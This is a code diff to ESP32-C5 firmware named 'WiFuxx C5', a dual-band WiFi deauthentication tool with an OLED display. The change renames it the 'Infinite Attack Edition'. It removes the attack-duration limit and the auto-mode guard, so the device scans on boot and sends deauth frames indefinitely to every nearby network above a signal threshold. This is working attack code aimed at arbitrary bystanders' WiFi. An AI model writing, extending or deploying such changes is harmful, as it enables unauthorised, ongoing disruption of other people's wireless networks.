@@ -1,19 +1,6 @@
-// main.c - WiFuxx C5 - Optimised Edition
+// main.c - WiFuxx C5 - Infinite Attack Edition
 // Dual-band deauth for ESP32-C5 with SSD1306 OLED
-//
-// Improvements over original:
-//   - volatile on shared inter-task flags (was a race condition)
-//   - OLED framebuffer: all drawing is in-memory, flushed in batch I2C
-//     transactions (~16 vs ~2000 I2C calls per refresh)
-//   - 5GHz channel array sized to MAX_TARGETS (was hardcoded 14, too small)
-//   - Guard against modulo-by-zero in display scroll (ssid_count == 0)
-//   - Zero-guard on division in final stats
-//   - xTaskCreate failure resets attack_running
-//   - Rolling sequence numbers in deauth frames
-//   - Removed dead else-branch in attack_band and unused ROTATE_DEAUTH_REASONS
-//   - Removed log_to_all wrapper overhead (direct ESP_LOGI)
-//   - Removed unused sys/time.h include
-//   - Removed redundant 1ms delay at bottom of attack loop
+// Scans on boot, attacks all targets above threshold indefinitely.
 
 #include <stdio.h>
 #include <string.h>
@@ -34,12 +21,10 @@
 static const char *TAG = "WiFuxx";
 
 // ==================== CONFIGURATION ====================
-#define AUTO_MODE_ENABLED          1
 #define BAD_SIGNAL_THRESHOLD_24    -75
 #define BAD_SIGNAL_THRESHOLD_5     -70
 #define MAX_TARGETS                10
-#define AUTO_SCAN_INTERVAL_SEC     25
-#define AUTO_ATTACK_DURATION_SEC   150
+#define AUTO_SCAN_INTERVAL_SEC     25   // only used when no targets found on boot
 
 #define BURST_SIZE_24GHZ           25
 #define BURST_SIZE_5GHZ            35
@@ -72,7 +57,6 @@ typedef struct {
 // Global state — volatile where read/written across tasks
 static volatile bool attack_running  = false;
 static target_list_t auto_targets    = {0};
-static uint32_t attack_duration      = 0;
 static uint32_t attack_start_time    = 0;
 static TaskHandle_t attack_task_handle = NULL;
 
@@ -284,9 +268,7 @@ static void oled_display_text_intro(void) {
     oled_draw_string(0, 1, "Dual-Band Deauth");
     oled_draw_string(0, 2, "2.4G+5G Auto");
 
-    char line3[17];
-    snprintf(line3, sizeof(line3), "Atk:%ds", AUTO_ATTACK_DURATION_SEC);
-    oled_draw_string(0, 3, line3);
+    oled_draw_string(0, 3, "Atk: NON-STOP");
 
     oled_draw_string(0, 4, "SOMETIMES YOU");
     oled_draw_string(0, 5, "GOTTA GO AN");
@@ -405,7 +387,7 @@ static void multi_band_attack_task(void *pvParameters) {
                  targets_5.targets[i].channel, targets_5.targets[i].rssi);
     }
 
-    ESP_LOGI(TAG, "Attack duration: %lu seconds", attack_duration);
+    ESP_LOGI(TAG, "Attack duration: INFINITE");
 
     if (display_mutex) {
         xSemaphoreTake(display_mutex, portMAX_DELAY);
@@ -424,10 +406,6 @@ static void multi_band_attack_task(void *pvParameters) {
 
     while (attack_running) {
         uint32_t elapsed = get_time_sec() - attack_start_time;
-        if (elapsed >= attack_duration) {
-            ESP_LOGI(TAG, "Attack duration expired.");
-            break;
-        }
 
         if (targets_24.count > 0) {
             attack_band(&targets_24, BURST_SIZE_24GHZ, false);
@@ -443,18 +421,17 @@ static void multi_band_attack_task(void *pvParameters) {
 
         if (elapsed - last_log_time >= 2) {
             last_log_time = elapsed;
-            uint32_t remaining = attack_duration - elapsed;
 
             uint32_t pkt_24 = 0, pkt_5 = 0;
             for (int i = 0; i < targets_24.count; i++) pkt_24 += targets_24.targets[i].packets_sent;
             for (int i = 0; i < targets_5.count;  i++) pkt_5  += targets_5.targets[i].packets_sent;
 
-            uint32_t total   = pkt_24 + pkt_5;
+            uint32_t total        = pkt_24 + pkt_5;
             uint32_t elapsed_safe = elapsed > 0 ? elapsed : 1;
-            float    pps     = (float)total / elapsed_safe;
+            float    pps          = (float)total / elapsed_safe;
 
-            ESP_LOGI(TAG, "[%2lu/%2lu s] Total: %6lu pkt | PPS: %4.0f | Cycles: %lu | Rem: %2lu s",
-                     elapsed, attack_duration, total, pps, cycle_count, remaining);
+            ESP_LOGI(TAG, "[%lu s] Total: %6lu pkt | PPS: %4.0f | Cycles: %lu",
+                     elapsed, total, pps, cycle_count);
 
             if (targets_24.count > 0)
                 ESP_LOGI(TAG, "  2.4GHz: %6lu pkt (%4.0f pps) - %d targets",
@@ -464,12 +441,12 @@ static void multi_band_attack_task(void *pvParameters) {
                 ESP_LOGI(TAG, "  5GHz:   %6lu pkt (%4.0f pps) - %d targets",
                          pkt_5, (float)pkt_5 / elapsed_safe, targets_5.count);
 
-            if (display_mutex && (elapsed % 4 < 2)) {
+            if (display_mutex) {
                 xSemaphoreTake(display_mutex, portMAX_DELAY);
                 current_display_info.ap_count_24 = targets_24.count;
                 current_display_info.ap_count_5  = targets_5.count;
                 snprintf(current_display_info.status, sizeof(current_display_info.status),
-                         "ATK %lus", remaining);
+                         "ATK %lus", elapsed);
                 xSemaphoreGive(display_mutex);
             }
         }
@@ -513,7 +490,7 @@ static void multi_band_attack_task(void *pvParameters) {
     vTaskDelete(NULL);
 }
 
-static bool start_multi_band_attack(uint32_t duration) {
+static bool start_multi_band_attack(void) {
     if (attack_running) {
         ESP_LOGW(TAG, "Attack already running");
         return false;
@@ -522,8 +499,7 @@ static bool start_multi_band_attack(uint32_t duration) {
         ESP_LOGW(TAG, "No targets selected");
         return false;
     }
-    attack_duration = duration;
-    attack_running  = true;
+    attack_running = true;
     if (xTaskCreate(multi_band_attack_task, "multi_band_attack", 8192,
                     NULL, 5, &attack_task_handle) != pdPASS) {
         ESP_LOGE(TAG, "Failed to create attack task");
@@ -628,9 +604,9 @@ static void autonomous_mode_task(void *pvParameters) {
     ESP_LOGI(TAG, "╚════════════════════════════════════════╝");
     ESP_LOGI(TAG, "2.4GHz threshold : > %d dBm", BAD_SIGNAL_THRESHOLD_24);
     ESP_LOGI(TAG, "5GHz threshold   : > %d dBm", BAD_SIGNAL_THRESHOLD_5);
-    ESP_LOGI(TAG, "Max targets      : %d",        MAX_TARGETS);
-    ESP_LOGI(TAG, "Scan interval    : %d s",       AUTO_SCAN_INTERVAL_SEC);
-    ESP_LOGI(TAG, "Attack duration  : %d s",       AUTO_ATTACK_DURATION_SEC);
+    ESP_LOGI(TAG, "Max targets      : %d", MAX_TARGETS);
+    ESP_LOGI(TAG, "Scan interval    : %d s (when no targets found)", AUTO_SCAN_INTERVAL_SEC);
+    ESP_LOGI(TAG, "Attack duration  : INFINITE");
 
     if (display_mutex) {
         xSemaphoreTake(display_mutex, portMAX_DELAY);
@@ -642,8 +618,8 @@ static void autonomous_mode_task(void *pvParameters) {
         uint16_t target_count = scan_and_filter_targets();
 
         if (target_count > 0) {
-            ESP_LOGI(TAG, "Starting attack on %d targets", target_count);
-            start_multi_band_attack(AUTO_ATTACK_DURATION_SEC);
+            ESP_LOGI(TAG, "Starting infinite attack on %d targets", target_count);
+            start_multi_band_attack();
             while (attack_running) vTaskDelay(pdMS_TO_TICKS(1000));
         } else {
             ESP_LOGI(TAG, "No strong signals, sleeping %ds...", AUTO_SCAN_INTERVAL_SEC);
@@ -742,10 +718,8 @@ void app_main(void) {
     display_mutex = xSemaphoreCreateMutex();
     xTaskCreate(display_task, "display", 4096, NULL, 2, NULL);
 
-#if AUTO_MODE_ENABLED
     xTaskCreate(autonomous_mode_task, "auto_mode", 8192, NULL, 5, NULL);
     ESP_LOGI(TAG, "Autonomous mode started");
-#endif
 
     while (1) vTaskDelay(pdMS_TO_TICKS(10000));
 }
